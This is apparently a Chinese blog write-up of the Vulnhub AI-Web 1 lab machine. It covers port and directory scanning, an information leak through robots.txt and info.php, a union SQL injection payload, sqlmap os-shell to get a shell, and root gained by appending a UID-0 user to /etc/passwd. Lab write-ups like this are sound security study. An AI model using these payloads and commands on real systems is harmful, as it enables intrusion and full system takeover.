---
title: "Vulnhub-Aiweb1"
date: "2024-07-13"
description: "系统:Linux服务器:Apache(版本未知)信息泄露: robots.txt路径泄露: /m3diNf0/             /se3reTdir777/uploads/"
---

机器信息

vulnhub 靶场 AI-Web 1

操作系统

linux

详细介绍

特训结业训练的 一个简单靶场，主要还是web的信息泄露和sql注入

sql注入碰巧又符合os-shell 可以拿到shell 之后就是一个简单的 passwd提权

# [](#0x00信息收集 "0x00信息收集")0x00信息收集

### [](#0x01循例端口扫描 "0x01循例端口扫描")0x01循例端口扫描

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-06 11:24 CSTNmap scan report for 192.168.49.128Host is up (0.00021s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 00:0C:29:23:04:32 (VMware)# 详细信息:PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd|_http-title: AI Web 1.0|_http-server-header: Apache| http-robots.txt: 2 disallowed entries |_/m3diNf0/ /se3reTdir777/uploads/MAC Address: 00:0C:29:23:04:32 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop
```

##### [](#资产整理 "资产整理")资产整理

> 系统:Linux  
> 服务器:Apache(版本未知)  
> 信息泄露: robots.txt  
> 路径泄露: /m3diNf0/ /se3reTdir777/uploads/

> 可以看出只有web资产

### [](#0x02扫描目录 "0x02扫描目录")0x02扫描目录

```shell
+ http://192.168.49.128/index.html (CODE:200|SIZE:141)               + http://192.168.49.128/robots.txt (CODE:200|SIZE:82)                + http://192.168.49.128/server-status (CODE:403|SIZE:222) [11:48:08] 403 -  220B  - /.ht_wsr.txt[11:48:09] 403 -  223B  - /.htaccess.orig[11:48:09] 403 -  225B  - /.htaccess.sample[11:48:09] 403 -  223B  - /.htaccess.bak1[11:48:09] 403 -  223B  - /.htaccess.save[11:48:09] 403 -  223B  - /.htaccess_orig[11:48:09] 403 -  221B  - /.htaccess_sc[11:48:09] 403 -  221B  - /.htaccessBAK[11:48:09] 403 -  221B  - /.htaccessOLD[11:48:09] 403 -  222B  - /.htaccessOLD2[11:48:09] 403 -  213B  - /.htm[11:48:09] 403 -  214B  - /.html[11:48:09] 403 -  223B  - /.htpasswd_test[11:48:09] 403 -  220B  - /.httr-oauth[11:48:09] 403 -  219B  - /.htpasswds[11:48:10] 403 -  213B  - /.php[11:48:10] 403 -  224B  - /.htaccess_extra  err[11:49:00] 200 -   80B  - /robots.txt                                 [11:49:01] 403 -  222B  - /server-status[11:49:01] 403 -  223B  - /server-status/
```

> 可以看到 robots.txt 除此之外没有什么别的东西了

403 了 这个url 因此[http://192.168.49.128/m3diNf0/](http://192.168.49.128/m3diNf0/)  
继续递归扫描目录

```shell
[14:57:12] 200 -   22KB - /m3diNf0/info.php 
```

一个信息泄露  
再次挨个扫目录不能说毫无收获 只能说一无所获

# [](#0x10-web "0x10 web")0x10 web

#### [](#信息泄露 "信息泄露")信息泄露

```shell
http://192.168.49.128/m3diNf0/info.php没有猜错OS |7.2.19-0ubuntu0.18.04.2|
```

#### [](#SQL注入 "SQL注入")SQL注入

```shell
http://192.168.49.128/se3reTdir777
```

联合查询 注入 而且感觉是一个回显注入

\*\*poc

```sql
1' union select version(),2,3 
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706155145.png)

\*\*First Name: aiweb1user@localhost  
Last Name: 5.7.42-0ubuntu0.18.04.1

# [](#0x20-Get-shell "0x20 Get_shell")0x20 Get\_shell

> 目前就找到一个sql注入 根据sql注入做文章 先停止信息收集  
> 最快可以getshell的只能是–os-shell  
> secure\_file\_priv 这个没在phpinfo()中查到  
> 但是可以知道用户

sqlmap 使用

[高权限:](%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md#%E9%AB%98%E6%9D%83%E9%99%90)

怎么说呢 我现在觉得只能去盲猜测 secure…. 没被设置 但是我们还要找到一个 当前用户有权限的一些路径 才能上传 getshell 试了常规的 /var/www/html 但是不行后来在

info.php 找到了根目录

/home/www/html/web1x443290o2sdf92213

但是也不行 只能试试uploads

|/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/|

成功  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706162859.png)

# [](#0x30-Post "0x30 Post")0x30 Post

> 第一步肯定是 linpeas 先上去扫一遍  
> 怎么说呢….好像傻了一样 找了多攻击向量但是都用不成 后来才发现 passwd 是我自己的 文件  
> 我可以执行 ….. 写操作果然还是不能把东西想的太高端 其实说实话还是要看到一个不能属主 属组 其他 就不看文件主人是谁

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706221859.png)

```shell
openssl passwd -1 -salt 123 123 echo "tom:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/usr/bin/zsh">> /etc/passwdsu tom 
```

拿到权限 ok 下机 —-
